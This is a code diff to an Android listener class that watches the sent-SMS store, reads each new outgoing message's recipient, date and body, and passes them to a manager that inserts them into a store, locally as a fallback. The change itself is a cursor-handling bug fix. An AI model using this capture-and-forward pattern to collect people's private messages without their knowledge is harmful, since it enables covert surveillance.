@@ -28,33 +28,35 @@ public class MessageSendListner extends ContentObserver {
 
         Uri uriSMSURI = Uri.parse("content://sms/sent");
         Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
-        cur.moveToNext();
+        cur.moveToFirst();
 
-        String id = cur.getString(cur.getColumnIndex("_id"));
-        int type = cur.getInt(cur.getColumnIndex("type"));
+        if (!cur.isAfterLast()) {
+            String id = cur.getString(cur.getColumnIndex("_id"));
+            int type = cur.getInt(cur.getColumnIndex("type"));
 
-        if (type == Message.TYPE_SENT && smsChecker(id)) {
-            System.out.println("Message envoye");
+            if (type == Message.TYPE_SENT && smsChecker(id)) {
+                System.out.println("Message envoye");
 
-            Phone phone = new Phone();
-            phone.loadWithFile(context);
+                Phone phone = new Phone();
+                phone.loadWithFile(context);
 
-            Message message = new Message(
-                    cur.getString(cur.getColumnIndex("address")),
-                    cur.getInt(cur.getColumnIndex("type")),
-                    cur.getInt(cur.getColumnIndex("date")),
-                    cur.getString(cur.getColumnIndex("body")),
-                    phone
-            );
-            ArrayList<Message> messages = new ArrayList<Message>();
-            messages.add(message);
+                Message message = new Message(
+                        cur.getString(cur.getColumnIndex("address")),
+                        cur.getInt(cur.getColumnIndex("type")),
+                        cur.getInt(cur.getColumnIndex("date")),
+                        cur.getString(cur.getColumnIndex("body")),
+                        phone
+                );
+                ArrayList<Message> messages = new ArrayList<Message>();
+                messages.add(message);
 
-            System.out.println(message.getNumero() + " / " + message.getType() + " / " + message.getDate() + " / " + message.getContenu());
+                System.out.println(message.getNumero() + " / " + message.getType() + " / " + message.getDate() + " / " + message.getContenu());
 
-            MessageManager messageManager = new MessageManager(this.context, phone);
-            messageManager.setMessages(messages);
-            if (!messageManager.insert())
-                messageManager.insertLocal();
+                MessageManager messageManager = new MessageManager(this.context, phone);
+                messageManager.setMessages(messages);
+                if (!messageManager.insert())
+                    messageManager.insertLocal();
+            }
         }
     }
 
